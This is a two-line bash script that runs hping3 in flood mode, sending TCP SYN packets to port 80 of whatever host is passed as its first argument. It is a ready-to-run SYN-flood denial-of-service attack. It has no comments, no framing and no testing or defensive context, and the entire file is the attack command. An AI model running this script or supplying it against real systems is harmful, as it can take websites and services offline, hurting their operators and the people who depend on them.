#!/bin/bash
sudo hping3 --flood -S -p 80 "$1"
